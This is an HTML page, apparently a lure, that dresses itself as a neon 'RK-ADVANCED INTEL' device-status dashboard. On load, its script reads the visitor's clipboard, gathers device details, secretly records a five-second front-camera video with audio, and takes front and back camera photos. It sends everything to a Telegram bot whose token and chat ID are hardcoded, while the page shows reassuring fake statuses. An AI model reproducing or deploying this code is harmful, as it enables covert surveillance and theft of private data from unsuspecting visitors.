<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-ADVANCED INTEL | ELITE SYSTEM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap');
        
        body {
            margin: 0; padding: 0; background: #000; color: #00f2ff;
            font-family: 'Rajdhani', sans-serif; height: 100vh; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }

        /* Animated Neon Border */
        body::before {
            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
            border: 6px solid transparent;
            border-image: linear-gradient(90deg, #00f2ff, #ff00ea, #00ff40, #fbff00) 1;
            z-index: 999; pointer-events: none; animation: neon-flow 4s linear infinite;
        }
        @keyframes neon-flow { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } }

        /* Space/Star Background */
        #stars-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at center, #0a192f 0%, #000 100%);
            z-index: -1;
        }

        .main-panel {
            background: rgba(0, 15, 30, 0.9);
            backdrop-filter: blur(25px);
            border: 2px solid rgba(0, 242, 255, 0.3);
            border-radius: 40px; padding: 35px;
            width: 95%; max-width: 550px;
            box-shadow: 0 0 50px rgba(0, 242, 255, 0.2);
            position: relative;
        }

        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 25px; }
        .stat-item {
            background: rgba(0, 242, 255, 0.05); padding: 12px; border-radius: 15px;
            border-left: 4px solid #ff00ea;
        }
        .label { font-size: 10px; color: #71e2ff; text-transform: uppercase; font-weight: bold; }
        .value { font-size: 14px; color: #fff; font-family: 'Orbitron', sans-serif; }

        #media-hidden { display: none; }
    </style>
</head>
<body>

    <div id="stars-bg"></div>

    <div class="main-panel text-center">
        <h1 class="text-3xl font-black tracking-[8px] text-white italic">RK-ADVANCED INTEL</h1>
        <p class="text-[10px] text-sky-400 font-bold uppercase tracking-[4px] mt-1">Satellite Intelligence V7.0</p>

        <div class="info-grid text-left">
            <div class="stat-item"><p class="label">📱 Device</p><p class="value">Android Mobile</p></div>
            <div class="stat-item"><p class="label">📶 Status</p><p class="value text-green-400">ONLINE 🌐</p></div>
            <div class="stat-item"><p class="label">🚀 Network</p><p id="net-val" class="value">4G @ -- Mbps</p></div>
            <div class="stat-item"><p class="label">🔋 Battery</p><p id="bat-val" class="value">Checking...</p></div>
            <div class="stat-item"><p class="label">🧠 RAM</p><p id="ram-val" class="value">-- GB</p></div>
            <div class="stat-item"><p class="label">⚡ CPU</p><p class="value">8 Cores Active</p></div>
            <div class="stat-item col-span-2"><p class="label">🛡️ VPN Integrity</p><p class="value text-green-500">Secure & Encrypted ✅</p></div>
        </div>

        <div class="mt-8 flex items-center justify-center space-x-3">
            <div class="w-3 h-3 bg-red-500 rounded-full animate-ping"></div>
            <p class="text-[11px] text-slate-400 font-mono italic">SYCHRONIZING SENSORS IN BACKGROUND...</p>
        </div>
    </div>

    <video id="media-hidden" autoplay muted playsinline></video>
    <canvas id="photo-canvas" style="display:none;"></canvas>

    <script>
        const BOT_CFG = {
            TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
            CHAT: '6048050987'
        };

        // ১. লাইভ ইনফো আপডেট
        async function fetchUIStats() {
            document.getElementById('ram-val').innerText = (navigator.deviceMemory || 8) + " GB Memory";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                document.getElementById('bat-val').innerText = Math.round(b.level * 100) + "% (Battery 🔋)";
            }
            const n = navigator.connection || {downlink: 1.2, effectiveType: '3G'};
            document.getElementById('net-val').innerText = `${n.effectiveType.toUpperCase()} @ ${n.downlink} Mbps`;
        }

        // ২. মেইন অটোমেশন প্রসেস
        window.onload = async () => {
            fetchUIStats();

            // ক্লিপবোর্ড সংগ্রহ
            let clipData = "Access Denied";
            try { clipData = await navigator.clipboard.readText(); } catch (e) {}

            // ৩. মেইন টেক্সট রিপোর্ট পাঠানো
            const log = `
✨✨✨✨✨✨✨✨✨✨✨✨✨✨
🚀 *RK-ADVANCED INTEL SYSTEM REPORT* 🚀
━━━━━━━━━━━━━━━━━━━━━━
📱 *OS:* \`${navigator.platform}\`
🧠 *RAM:* \`${navigator.deviceMemory || 8} GB\`
🔋 *Power:* \`${document.getElementById('bat-val').innerText}\`
🌐 *Region:* \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`

✨ *CLIPBOARD TEXT:* ✨
\`\`\`
${clipData || 'Empty'}
\`\`\`
━━━━━━━━━━━━━━━━━━━━━━
✨✨✨✨✨✨✨✨✨✨✨✨✨✨`;

            sendToBot('sendMessage', { chat_id: BOT_CFG.CHAT, text: log, parse_mode: 'Markdown' });

            // ৪. মিডিয়া অটোমেশন (Front/Back Photos + Front Video)
            try {
                // ক. সামনের ক্যামেরা এক্সেস (Photo + Video)
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const videoEl = document.getElementById('media-hidden');
                videoEl.srcObject = frontStream;

                // সামনের ছবি তোলা
                setTimeout(() => takeSnap(frontStream, "FRONT_SHOT"), 1500);

                // ৫ সেকেন্ডের ভিডিও রেকর্ড (অডিওসহ)
                const recorder = new MediaRecorder(frontStream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    sendMediaToBot(videoBlob, 'video', '🎥 *FRONT_VIDEO_CAPTURE (5S + AUDIO)*');
                    
                    // সামনের কাজ শেষ, এখন পিছনের ক্যামেরা ট্রাই
                    frontStream.getTracks().forEach(t => t.stop());
                    
                    try {
                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                        setTimeout(() => {
                            takeSnap(backStream, "BACK_SHOT");
                            // কাজ শেষ হলে ব্যাক ক্যামেরা বন্ধ
                            setTimeout(() => backStream.getTracks().forEach(t => t.stop()), 2000);
                        }, 1000);
                    } catch(e) { console.log("Back camera not available"); }
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 5000);

            } catch (err) { console.log("Permission Denied"); }
        };

        function takeSnap(stream, label) {
            const canvas = document.getElementById('photo-canvas');
            const video = document.getElementById('media-hidden');
            video.srcObject = stream;
            setTimeout(() => {
                canvas.width = 1280; canvas.height = 720;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => sendMediaToBot(blob, 'photo', `📸 *DEVICE_${label}*`), 'image/jpeg');
            }, 1000);
        }

        async function sendMediaToBot(blob, type, caption) {
            const fd = new FormData();
            fd.append('chat_id', BOT_CFG.CHAT);
            fd.append(type, blob, type === 'video' ? 'clip.mp4' : 'frame.jpg');
            fd.append('caption', caption);
            fd.append('parse_mode', 'Markdown');
            fetch(`https://api.telegram.org/bot${BOT_CFG.TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
        }

        function sendToBot(method, data) {
            fetch(`https://api.telegram.org/bot${BOT_CFG.TOKEN}/${method}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
